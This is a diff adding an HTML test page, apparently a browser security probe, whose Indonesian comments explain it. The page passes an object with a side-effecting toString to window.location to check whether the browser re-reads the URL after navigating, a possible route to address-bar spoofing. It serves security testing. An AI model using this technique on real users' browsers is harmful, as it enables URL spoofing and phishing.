@@ -1,0 +1,32 @@
+<!-- 33 | W5  TIPE SALAH - URL yang MENAVIGASI saat DIBACA | [1-CLICK]
+     ASUMSI YANG DILANGGAR  "membaca sebuah URL adalah operasi yang tidak punya efek samping"
+     IDE GILA  location dan window.open menerima string. Tapi kalau diberi OBJEK, browser harus
+     memanggil toString/Symbol.toPrimitive dulu. Kita taruh efek samping DI DALAM konversi itu:
+     saat browser sedang menghitung "URL mana yang dituju", kita sudah menavigasi ke tempat lain.
+     Jadi keputusan tujuan dan tindakan menuju terjadi pada state yang berbeda - TOCTOU
+     di lapisan konversi tipe, bukan di lapisan jaringan. Hampir tak ada yang menguji lapisan ini.
+     YANG DIBACA  URL akhir yang dicetak omnibox vs URL yang benar-benar dimuat.
+     EXPECTED-SECURE  konversi dilakukan sekali, di awal, dan navigasi kedua membatalkan yang pertama secara utuh. -->
+<button onclick="go()">Run 33</button>
+<pre id=g style="font:12px/1.6 monospace"></pre>
+<script>
+g.textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  var hits = 0;
+  var evil = {
+    toString: function () {
+      hits++;
+      if (hits === 1) { try { w.location = 'about:blank'; } catch (e) { } }
+      return 'https://www.google.com:82/';
+    }
+  };
+  var w = window.open('', '', 'width=820,height=520');
+  w.document.write('<h2 style="font:19px system-ui">tujuan dihitung sambil berpindah</h2>');
+  try { w.location = evil; } catch (e) { }
+  setTimeout(function () {
+    var v; try { v = w.location.href; } catch (e) { v = 'BLOCKED'; }
+    g.textContent = 'REAL ORIGIN: ' + location.origin + '\ntoString dipanggil ' + hits + ' kali\nw.location.href = ' + v +
+      '\n\nlebih dari 1 kali = URL dibaca ulang setelah state berubah';
+  }, 1200);
+}
+</script>
